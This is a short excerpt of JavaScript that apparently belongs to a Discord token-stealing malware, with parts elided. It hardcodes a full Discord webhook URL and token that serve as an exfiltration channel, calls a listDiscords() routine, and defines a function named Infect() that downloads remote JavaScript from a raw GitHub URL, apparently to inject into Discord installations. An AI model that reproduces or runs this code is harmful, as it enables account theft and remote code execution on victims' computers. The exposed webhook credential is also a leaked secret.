...
const webhook = "https://ptb.discord.com/api/webhooks/939516130748432444/GCFj5EznCbdhvdM5JFNicOSiN9XxX8HsHhKhZH_wCQ6XbT1WEBLvk7IjjISEAe_pKpLC"
...
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/Lowki1337/api/README.md/api1.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
